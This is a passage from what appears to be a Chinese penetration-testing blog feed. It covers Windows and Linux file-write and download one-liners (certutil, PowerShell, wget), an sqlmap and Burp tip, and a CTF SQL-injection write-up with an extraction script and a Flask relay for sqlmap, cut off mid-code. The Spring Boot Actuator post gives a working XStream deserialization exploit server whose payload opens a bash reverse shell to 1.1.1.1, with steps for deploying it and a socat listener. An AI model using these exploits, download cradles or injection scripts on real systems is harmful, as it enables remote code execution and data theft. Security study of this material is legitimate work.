<h4 id="certutil-base64解码写入"><a href="#certutil-base64解码写入" class="headerlink" title="certutil base64解码写入"></a>certutil base64解码写入</h4><p>上面提到<code>echo</code>写入万恶的转义问题，那么，通过base64编码是不是可以解决这烦人的转义问题呢？是的！<br>比如，我们要把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>（base64编码为：<code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>）写入文件，可用如下方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== &gt; 1.txt</span><br><span class="line">certutil.exe -decode 1.txt 2.jsp</span><br></pre></td></tr></table></figure>
<p>这时候<code>2.jsp</code>就是要写入的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 2.jsp</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>顺带一提，<code>certutil</code>下载文件的方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &lt;url&gt;</span><br><span class="line">示例：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt</span><br><span class="line">或者：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt 2.txt</span><br></pre></td></tr></table></figure>
<p>不幸的是，<strong>即使下载的不是有毒文件，杀软还是很可能会杀掉：</strong><br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-05-57.png"><br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-06-02.png"></p>
<h4 id="powershell-base64写入"><a href="#powershell-base64写入" class="headerlink" title="powershell base64写入"></a>powershell base64写入</h4><p><code>powershell</code>写入的方法就简单得多，如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;</span></span><br><span class="line">[<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$data</span>))</span><br></pre></td></tr></table></figure>
<p>效果如下，在后面加上重定向符即可写入文件:<br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-06-50.png"></p>
<h4 id="powershell下载文件"><a href="#powershell下载文件" class="headerlink" title="powershell下载文件"></a>powershell下载文件</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">打印远程文件到控制台：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">或者：</span><br><span class="line">powershell <span class="literal">-c</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">直接下载文件：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFileAsync(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>, <span class="string">&#x27;1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-07-43.png"></p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>因为Linux一般都自带base64命令，这里就不讨论转义的问题了。</p>
<h4 id="bash-base64写入"><a href="#bash-base64写入" class="headerlink" title="bash base64写入"></a>bash base64写入</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== |base64 -d &gt; 1.txt</span><br></pre></td></tr></table></figure>

<h4 id="wget-下载"><a href="#wget-下载" class="headerlink" title="wget 下载"></a>wget 下载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.245.130:8080/1.txt -O 1.jsp</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://rinige.com/index.php/archives/794/">CMD SHELL ECHO 写文件</a><br><a href="https://codeday.me/bug/20190305/738026.html">用powershell解码base64</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMAP小技巧</title>
    <url>/2021/05/26/SQLMAP%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在日常使用sqlmap中，可能我们会遇到明明手工注入能发现注入点，但是sqlmap发两个包就不再往下跑了，这是怎么回事呢？又该如何解决？</p>
<a id="more"></a>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>这是一个注入点，但是sqlmap只发了两个包<br><img data-src="/2021/05/26/SQLMAP%E5%B0%8F%E6%8A%80%E5%B7%A7/2021-05-28-11-10-07.png"></p>
<p>根据上面的提示，sqlmap应该是因为响应包状态码为<code>401</code>，认为需要授权，实际上是该注入点比较特殊，数据格式异常或者命中拦截规则的时候会返回<code>401</code>状态码</p>
<p>正常访问的响应：<br><img data-src="/2021/05/26/SQLMAP%E5%B0%8F%E6%8A%80%E5%B7%A7/2021-05-28-11-18-51.png"><br>数据格式异常：<br><img data-src="/2021/05/26/SQLMAP%E5%B0%8F%E6%8A%80%E5%B7%A7/2021-05-28-11-19-37.png"></p>
<p>这个时候最简单的办法，当然是通过burp把响应包改掉了，我们只要在burp新建一条自动匹配修改规则即可，让burp自动把<code>401</code>的状态码改成<code>200</code><br><img data-src="/2021/05/26/SQLMAP%E5%B0%8F%E6%8A%80%E5%B7%A7/2021-05-28-11-21-05.png"></p>
<p>创建成功后，把sqlmap的代理设置成burp即可，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r tmp\sql2.txt --proxy http://192.168.154.137:8080</span><br></pre></td></tr></table></figure>
<p>这个时候可以看到sqlmap能正常往下测试了：<br><img data-src="/2021/05/26/SQLMAP%E5%B0%8F%E6%8A%80%E5%B7%A7/2021-05-28-11-26-12.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot Actuators未授权GetShell</title>
    <url>/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块。其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：  </p>
<a id="more"></a>

<table>
<thead>
<tr>
<th>Http 方法</th>
<th>路径</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>get</td>
<td>/autoconfig</td>
<td>提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</td>
</tr>
<tr>
<td>get</td>
<td>/configprops</td>
<td>描述配置属性（包含默认值）如何注入 Bean</td>
</tr>
<tr>
<td>get</td>
<td>/beans</td>
<td>描述应用程序上下文里全部的 Bean，以及它们的关系</td>
</tr>
<tr>
<td>get</td>
<td>/dump</td>
<td>获取线程活动的快照</td>
</tr>
<tr>
<td>get</td>
<td>/env</td>
<td>获取全部环境属性</td>
</tr>
<tr>
<td>get</td>
<td>/env/{name}</td>
<td>根据名称获取特定的环境属性值</td>
</tr>
<tr>
<td>get</td>
<td>/health</td>
<td>报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td>
</tr>
<tr>
<td>get</td>
<td>/info</td>
<td>获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
</tr>
<tr>
<td>get</td>
<td>/mappings</td>
<td>描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td>
</tr>
<tr>
<td>get</td>
<td>/metrics</td>
<td>报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
</tr>
<tr>
<td>get</td>
<td>/metrics/{name}</td>
<td>报告指定名称的应用程序度量值</td>
</tr>
<tr>
<td>post</td>
<td>/shutdown</td>
<td>关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td>
</tr>
<tr>
<td>get</td>
<td>/trace</td>
<td>提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td>
</tr>
</tbody></table>
<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>访问web应用的<code>/actuator/env</code>或<code>/env</code>，如果有返回json格式的数据则可能存在漏洞。</p>
<h3 id="漏洞exp"><a href="#漏洞exp" class="headerlink" title="漏洞exp"></a>漏洞exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                    &lt;string&gt;bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;bash -i &gt;/dev/tcp/1.1.1.1/50101 0&gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">50102</span>)</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先把exp保存为<code>exp.py</code>文件，然后修改第22行的ip地址为接收反弹shell的ip，然后运行<code>exp.py</code>：<br><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-43-34.png"></p>
<p>配置<code>eureka.client.serviceUrl.defaultZone=http://1.1.1.1:50102/xstream</code>，其中的ip地址为<code>exp.py</code>监听的地址：<br><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-45-25.png"></p>
<p>然后通过<code>refresh</code>端点刷新，靶机将通过刚刚在<code>env</code>配置的<code>eureka.client.serviceUrl.defaultZone</code>路径发起请求，获取恶意XML文件：<br><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-48-27.png"></p>
<p><code>exp.py</code>接收到靶机发起的请求：<br><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-49-49.png"></p>
<p>获得反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat tcp-l:50101,fork,reuseaddr -</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-50-54.png"></p>
<p><strong>注意：</strong> <code>http://1.1.1.1:50102/xstream</code>返回的是<code>application/xml</code>格式数据，否则服务端不认，所以需要运行<code>exp.py</code>来做服务。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/news/193509.html">Springboot之actuator配置不当的漏洞利用</a><br><a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Spring Boot Actuators配置不当导致RCE漏洞复现</a></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入进阶:FLASK加工中转SQLMAP流量</title>
    <url>/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在渗透工作中我们经常能碰到一些逻辑复杂的SQL注入漏洞，并不能直接通过sqlmap工具注入拿到结果。今年网鼎杯的一道SQL注入题“张三的网站”让我久久不能忘怀，我不断思考遇到这类型的SQL注入除了手工注入然后编写脚本一点一点脱数据以外，有没有一个比较优雅的解决方案呢？</p>
<h3 id="一道CTF题的思考"><a href="#一道CTF题的思考" class="headerlink" title="一道CTF题的思考"></a>一道CTF题的思考</h3><p>先来说说“张三的网站”这道题目，因为我手上没有题目源码，所以就根据记忆中的各个功能自己写了一个（很少写php，代码很烂），相关代码已经上传到GitHub，见文章底部。</p>
<a id="more"></a>
<p>该题目主要涉及3个页面：</p>
<ol>
<li>登陆页面<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-23-16.png"></li>
<li>注册页面<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-23-38.png"></li>
<li>登陆后的主页<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-26-22.png"></li>
</ol>
<p>题目中的登陆页面、注册页面均无SQL注入漏洞，但是登陆后的主页在用户名处存在SQL注入漏洞。要利用此漏洞，需要在注册页面控制用户名，邮箱使用随机数生成的邮箱，密码随意，然后使用邮箱和注册时的密码登陆，登陆成功后跳转到主页，此时触发SQL注入漏洞。<br>注册名为“123”的用户：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-55-42.png"><br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-57-53.png"><br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-58-04.png"><br>注册名为“123’”的用户：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-40-25.png"><br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-40-35.png"></p>
<p>以下是一个Python脚本手工注入的解法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">username, email, password=<span class="string">&#x27;123&#x27;</span></span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130:80/web/register.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.154.130&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.154.130/web/register.php&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;name&quot;</span>: username, <span class="string">&quot;pw&quot;</span>: password, <span class="string">&quot;repw&quot;</span>: password, <span class="string">&quot;email&quot;</span>: email, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">email, password=<span class="string">&#x27;123&#x27;</span></span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130:80/web/login.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.154.130&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.154.130/web/login.php&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;email&quot;</span>: email, <span class="string">&quot;pw&quot;</span>: password, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r1 = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy)</span><br><span class="line">    <span class="comment"># 跳转首页</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130/web/index.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://a434051f6c184741b1ede6b610a15f805a546b5b172748e9.changame.ichunqiu.com/login.php&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    r2 = session.get(burp0_url, headers=burp0_headers, proxies=proxy)</span><br><span class="line">    <span class="keyword">if</span> r2.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;username payload no work&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> r2.status_code == <span class="number">200</span>:</span><br><span class="line">        pattern = <span class="string">&#x27;&#x27;&#x27;&lt;span class=&quot;user-name&quot;&gt;(.+?)&lt;/span&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            userr = re.findall(pattern, r2.text, re.DOTALL)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> userr:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    key = string.ascii_lowercase + string.digits + <span class="string">&#x27;&#123;&#125;_-&#x27;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> keynum <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">43</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> key:</span><br><span class="line">            username = <span class="string">r&quot;&quot;&quot;&#x27;or(substr((select e.a from (select (select 1)a union select * from flag)e limit 2 offset 1) from &#123;0&#125; for 1) = &#x27;&#123;1&#125;&#x27;) and &#x27;1&quot;&quot;&quot;</span>.<span class="built_in">format</span>(keynum, s)</span><br><span class="line">            email = <span class="string">&#x27;&#123;&#125;@qq.com&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(random.random() * <span class="number">10000000</span>))</span><br><span class="line">            register(username, email)</span><br><span class="line">            <span class="keyword">if</span> login(email):</span><br><span class="line">                flag += s</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;key: &#x27;</span> + flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">       </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>如果对ctf不熟悉的朋友应该会很懵，因为语句中直接查询获取了flag表中的内容，而正常情况下，我们是不知道真正的flag在上面表，这样的解法我个人觉得不具备通用性，当然了在ctf比赛中是很高效的。</p>
<p>那么，有没有可能通过sqlmap来进行注入呢？显然，直接使用sqlmap不进行二次开发是无法检测出注入点的，因为sqlmap的注入逻辑不支持多个数据包的逻辑处理。于是我在想有无一种办法，拿到sqlmap的注入检测payload，然后我们通过Python编写相应的请求逻辑，再把响应结果返回到sqlmap呢？答案是可行的！</p>
<h3 id="Flask中转sqlmap注入"><a href="#Flask中转sqlmap注入" class="headerlink" title="Flask中转sqlmap注入"></a>Flask中转sqlmap注入</h3><p>代码实现的结构如下，首先创建一个flask服务，接收<code>payload</code>参数的值，然后传入函数<code>custom_fun</code>中，<code>custom_fun</code>函数由自己编写请求逻辑，把<code>payload</code>参数的值填入到存在注入点的参数中，然后发起请求，把最终响应结果return就行。最后通过sqlmap检测URL：<code>http://127.0.0.1:5000/?payload=1</code>即可，可以适当调整sqlmap的注入参数，比如<code>--level</code>、<code>--risk</code>、<code>--technique</code>等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">custom_fun</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        payload = request.args.get(<span 